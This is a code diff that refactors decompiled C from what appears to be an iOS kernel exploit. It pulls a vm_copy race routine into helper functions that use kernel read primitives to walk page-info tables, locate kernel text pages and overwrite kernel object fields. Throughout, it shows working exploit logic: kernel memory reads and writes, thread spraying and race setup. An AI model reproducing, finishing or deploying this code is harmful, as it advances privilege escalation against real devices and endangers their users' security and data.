@@ -154,6 +154,20 @@ typedef struct VmcopyTriggerThreadBlock
   semaphore_t resumeSemaphore;
 } VmcopyTriggerThreadBlock;
 
+typedef struct VmcopyPackedMemoryEntry
+{
+  vm_address_t address;
+  vm_address_t offset;
+  vm_size_t size;
+  mem_entry_name_port_t objectHandle;
+  uint32_t pageInfoRef;
+  uint32_t reserved;
+  uint64_t objectKaddr;
+  uint64_t pageInfoDataKaddr;
+  uint64_t pageInfoKaddr;
+  uint64_t pageInfoTableBase;
+} VmcopyPackedMemoryEntry;
+
 enum
 {
   VMCOPY_KREAD_CTX_OFFSET = 8,
@@ -197,6 +211,9 @@ enum
   VMCOPY_EXCEPTION_MSG_ALLOC_SIZE = 0x800,
   VMCOPY_EXCEPTION_MSG_RECV_SIZE = 0x400,
   VMCOPY_PAGE_INFO_PAYLOAD_WORDS = 30,
+  VMCOPY_MEMORY_ENTRY_MAPPING_SIZE = 0xC000,
+  VMCOPY_MEMORY_ENTRY_PAGE_SIZE = 0x4000,
+  VMCOPY_PACKED_PAGE_INFO_BASE_BIAS = 0x1800000000LL,
   VMCOPY_FINAL_WAIT_LINK_MARKER = 0x41414141u,
   VMCOPY_FINAL_MSG_LINK_MARKER = 0x42424242u,
   VMCOPY_FINAL_ARG5_MARKER = 0x43434343u,
@@ -696,6 +713,77 @@ static inline uint64_t vmcopy_find_page_info_for_physical(
   }
 
   return pageInfo;
+}
+
+static inline VmcopyPackedMemoryEntry vmcopy_make_packed_memory_entry(
+        __int64 kreadCtx,
+        uint64_t linearPageInfoBase,
+        uint32_t pageShift)
+{
+  VmcopyPackedMemoryEntry entry;
+
+  do
+  {
+    memset(&entry, 0, sizeof(entry));
+    entry.size = VMCOPY_MEMORY_ENTRY_PAGE_SIZE;
+
+    vm_map(
+      mach_task_self_,
+      &entry.address,
+      VMCOPY_MEMORY_ENTRY_MAPPING_SIZE,
+      0,
+      1,
+      0,
+      0,
+      0,
+      0,
+      0,
+      2u);
+    entry.offset = entry.address + VMCOPY_MEMORY_ENTRY_PAGE_SIZE;
+    vm_allocate(mach_task_self_, &entry.offset, entry.size, VMCOPY_MEMORY_ENTRY_PAGE_SIZE);
+    *(uint64_t *)entry.offset = VMCOPY_MARKER64;
+    mach_make_memory_entry(mach_task_self_, &entry.size, entry.offset, 3, &entry.objectHandle, 0);
+
+    entry.objectKaddr = get_task_kobject_addr_from_field32(kreadCtx, entry.objectHandle);
+    uint64_t objectPager = kread_u64_value(kreadCtx, entry.objectKaddr + 16);
+    entry.pageInfoDataKaddr = kread_u64_value(kreadCtx, objectPager + 24);
+    uint32_t linearRef = kread_u32_value(kreadCtx, entry.pageInfoDataKaddr + 60);
+    entry.pageInfoKaddr = vmcopy_page_info_addr_from_ref(linearRef, 0, linearPageInfoBase, pageShift);
+    entry.pageInfoTableBase = kread_u64_value(kreadCtx, entry.pageInfoKaddr + 32);
+    entry.pageInfoRef = kread_u32_value(kreadCtx, entry.pageInfoKaddr);
+  }
+  while ( (entry.pageInfoRef & 0x80000000) == 0 );
+
+  return entry;
+}
+
+static inline uint64_t vmcopy_find_kernel_text_page_info(
+        __int64 state,
+        uint64_t packedPageInfoBase,
+        uint64_t linearPageInfoBase,
+        uint32_t pageShift)
+{
+  __int64 kreadCtx = *(uint64_t *)(state + VMCOPY_KREAD_CTX_OFFSET);
+  __int64 krwCtxRaw = *(uint64_t *)(kreadCtx + 32);
+  uint64_t kernelTextStart = *(uint64_t *)(krwCtxRaw + 6632);
+  uint64_t kernelTextEnd = *(uint64_t *)(krwCtxRaw + 6640);
+
+  for ( uint64_t scanOffset = 0; ; scanOffset += 48 )
+  {
+    uint64_t pageInfoKaddr = packedPageInfoBase + scanOffset;
+    uint64_t physBase = kread_u64_value(kreadCtx, pageInfoKaddr + 24);
+    if ( physBase < kernelTextStart || physBase >= kernelTextEnd || (physBase & 0x3FFF) != 0 )
+      continue;
+
+    uint32_t mappedRef = kread_u32_value(kreadCtx, pageInfoKaddr + 32);
+    *(uint64_t *)(state + 32) = mappedRef;
+    if ( !mappedRef )
+      continue;
+
+    uint64_t mappedPageInfo = vmcopy_page_info_addr_from_ref(mappedRef, packedPageInfoBase, linearPageInfoBase, pageShift);
+    if ( kread_u32_value(kreadCtx, mappedPageInfo + 48) > 0xFFF )
+      return mappedPageInfo;
+  }
 }
 
 static inline __int64 physmap_find_free_vm_region(vm_size_t requiredSize, vm_address_t *baseOut, vm_size_t *sizeOut)
@@ -8229,22 +8317,6 @@ __int64 __fastcall call_vtable_ptr_slot2(__int64 a1)
 __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
 {
   __int64 *v2; // x20
-  unsigned __int64 v3; // x24
-  __int64 v4; // x0
-  __int64 v5; // x23
-  unsigned int v6; // w0
-  unsigned __int64 v7; // x27
-  __int64 v8; // x22
-  unsigned int v9; // w0
-  int v10; // w21
-  __int64 v11; // x0
-  __int64 v12; // x8
-  unsigned __int64 v13; // x22
-  unsigned __int64 v14; // x25
-  unsigned __int64 v15; // x27
-  unsigned __int64 v16; // x0
-  bool v17; // cf
-  unsigned int v19; // w0
   unsigned __int64 v20; // x27
   thread_act_t v22; // w1
   unsigned __int64 v23; // x25
@@ -8300,9 +8372,7 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   thread_act_t target_act; // [xsp+334h] [xbp-3CCh] BYREF
   thread_act_t v154; // [xsp+338h] [xbp-3C8h] BYREF
   mem_entry_name_port_t object_handle; // [xsp+33Ch] [xbp-3C4h] BYREF
-  vm_address_t address; // [xsp+340h] [xbp-3C0h] BYREF
   vm_size_t size; // [xsp+348h] [xbp-3B8h] BYREF
-  vm_address_t offset; // [xsp+350h] [xbp-3B0h] BYREF
   int v159; // [xsp+35Ch] [xbp-3A4h] BYREF
   semaphore_t v160; // [xsp+360h] [xbp-3A0h] BYREF
   semaphore_t semaphore; // [xsp+364h] [xbp-39Ch] BYREF
@@ -8324,58 +8394,21 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   semaphore_create(mach_task_self_, &v160, 0, 0);
   v159 = 0;
   v106 = kernel_va_base_resolver(KRWCTX_FROM_RAW_FIELD(*v2, 32), 0, &v159);
-  do
-  {
-    offset = 0;
-    size = 0x4000;
-    address = 0;
-    vm_map(mach_task_self_, &address, 0xC000u, 0, 1, 0, 0, 0, 0, 0, 2u);
-    offset = address + 0x4000;
-    vm_allocate(mach_task_self_, &offset, size, 0x4000);
-    *(uint64_t *)offset = 0xC0C0C0C0C0C0C0C0LL;
-    mach_make_memory_entry(mach_task_self_, &size, offset, 3, &object_handle, 0);
-    v3 = get_task_kobject_addr_from_field32(*v2, object_handle);
-    v4 = kread_u64_value(*v2, v3 + 16);
-    v5 = kread_u64_value(*v2, v4 + 24);
-    v6 = kread_u32_value(*v2, v5 + 60);
-    v7 = vmcopy_page_info_addr_from_ref(v6, 0, v106, v159);
-    v8 = kread_u64_value(*v2, v7 + 32);
-    v9 = kread_u32_value(*v2, v7);
-  }
-  while ( (v9 & 0x80000000) == 0 );
-  v95 = v7;
-  v10 = 0;
-  v109 = v8 - 48LL * v9 + 0x1800000000LL;
-  v11 = *(uint64_t *)(someStruct + 8);
-  v12 = *(uint64_t *)(v11 + 32);
-  v13 = *(uint64_t *)(v12 + 6632);
-  v14 = *(uint64_t *)(v12 + 6640);
-  while ( 1 )
-  {
-    v15 = v109 + (v10 & 0xFFFFFFF0);
-    v16 = kread_u64_value(v11, v15 + 24);
-    v17 = v16 < v13 || v16 >= v14;
-    if ( !v17 && (v16 & 0x3FFF) == 0 )
-    {
-      v19 = kread_u32_value(*(uint64_t *)(someStruct + 8), v15 + 32);
-      *(uint64_t *)(someStruct + 32) = v19;
-      if ( v19 )
-      {
-        v20 = vmcopy_page_info_addr_from_ref(v19, v109, v106, v159);
-        if ( (unsigned int)kread_u32_value(*v2, v20 + 48) > 0xFFF )
-          break;
-      }
-    }
-    v11 = *v2;
-    v10 += 48;
-  }
-  kwrite_u64_to_addr(*v2, v3 + 24, 0);
-  kwrite_u64_to_addr(*v2, v3 + 32, -16384);
+  VmcopyPackedMemoryEntry memoryEntry = vmcopy_make_packed_memory_entry(*v2, v106, v159);
+  size = memoryEntry.size;
+  object_handle = memoryEntry.objectHandle;
+  v95 = memoryEntry.pageInfoKaddr;
+  v109 = memoryEntry.pageInfoTableBase
+       - 48LL * memoryEntry.pageInfoRef
+       + VMCOPY_PACKED_PAGE_INFO_BASE_BIAS;
+  v20 = vmcopy_find_kernel_text_page_info(someStruct, v109, v106, v159);
+  kwrite_u64_to_addr(*v2, memoryEntry.objectKaddr + 24, 0);
+  kwrite_u64_to_addr(*v2, memoryEntry.objectKaddr + 32, -16384);
   v154 = 0;
   vmcopy_spray_threads(&v154, VMCOPY_THREAD_SPRAY_COUNT);
   v107 = 0;
   target_act = 0;
-  v103 = v5 + 48;
+  v103 = memoryEntry.pageInfoDataKaddr + 48;
   v102 = v95 - v106;
   v94 = (void *)(someStruct + 44);
   do
